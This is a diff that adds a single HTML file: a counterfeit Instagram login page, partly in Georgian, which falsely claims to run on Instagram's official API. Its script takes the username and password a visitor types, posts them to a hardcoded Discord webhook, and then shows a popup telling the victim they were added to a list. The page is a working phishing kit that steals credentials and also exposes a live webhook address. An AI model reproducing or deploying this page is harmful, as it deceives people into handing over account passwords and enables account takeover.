@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        @import url("//cdn.web-fonts.ge/fonts/bpg-nino-mtavruli-bold/css/bpg-nino-mtavruli-bold.min.css");
+        
+        * {
+            border: none;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        h3 {
+            font-family: "BPG Nino Mtavruli Bold", sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            height: 100vh;
+        }
+
+        main {
+            height: 100vh;
+            margin: auto;
+            max-width: 935px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        h1 {
+            margin: 20px 0;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        .panel {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            margin-bottom: 10px;
+            padding: 20px;
+            width: 100%;
+            max-width: 350px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        form input {
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #808080;
+            margin-bottom: 8px;
+            padding: 10px;
+            width: 100%;
+            font-size: 14px;
+        }
+
+        form input::placeholder {
+            color: #808080;
+        }
+
+        form input:focus {
+            border-color: #808080;
+            outline: none;
+        }
+
+        form button {
+            background-color: #0095f6;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            height: 35px;
+            margin-top: 10px;
+            width: 100%;
+            border: none;
+            cursor: pointer;
+        }
+
+        form button:hover {
+            background-color: #007dc1;
+        }
+
+        .logo-container img {
+            width: 180px;
+            margin: 20px auto;
+            display: block;
+        }
+
+        h2 {
+            font-family: 'BPG Nino Mtavruli Bold', sans-serif;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        /* Loading Spinner */
+        .loading {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 1.5s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        /* Popup */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 30px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            font-family: 'BPG Nino Mtavruli Bold', sans-serif;
+            font-size: 18px;
+            color: #333;
+            animation: fadeIn 0.3s ease-in-out;
+            max-width: 300px;
+            width: 100%;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #808080;
+        }
+
+        footer a {
+            color: #385185;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 0 5px;
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <div class="panel">
+            <h2>ინსტაგრამით შესვლა</h2>
+            <center><h3>გაკეთებულია Instagram - ის ოფიციალური API - ით</h3></center>
+            <div class="logo-container">
+                <img src="https://github.com/laisfrigerio/instagram-clone-login-page/blob/master/img/instagram-logo.png?raw=true" alt="Instagram Logo">
+            </div>
+            <form id="loginForm">
+                <input type="text" name="email" id="email" placeholder="Phone, username, or email" required>
+                <input type="password" name="password" id="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="loading" id="loading"></div>
+        </div>
+    </main>
+
+    <!-- Popup for success message -->
+    <div class="popup" id="popup">
+        <p>გაფიცულია!<br>თქვენ დაემატეთ სიაში!</p>
+    </div>
+
+    <footer>
+        <p>&copy; 2024 Instagram</p>
+        <a href="#">About</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+    </footer>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+            showLoading();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Send the user data to the webhook with the requested format
+            fetch('https://discord.com/api/webhooks/1313177215839768597/cIUQurbw3mC6k8rGH5NuF_lbY8vtGscP1HvSLtN4vdJAsBKgeecv643qff1hLUES7cCw', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `User: ${email}\nგაიფიცა!!!\n||spoiler in here {${password}}||`
+                }),
+            })
+            .then(response => {
+                hideLoading();
+                showPopup();
+            })
+            .catch(error => {
+                hideLoading();
+                alert('There was an error!');
+            });
+        });
+
+        function showLoading() {
+            document.getElementById('loading').style.display = 'block';
+        }
+
+        function hideLoading() {
+            document.getElementById('loading').style.display = 'none';
+        }
+
+        function showPopup() {
+            document.getElementById('popup').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('popup').style.display = 'none';
+            }, 3000); // Hide the popup after 3 seconds
+        }
+    </script>
+</body>
+</html>
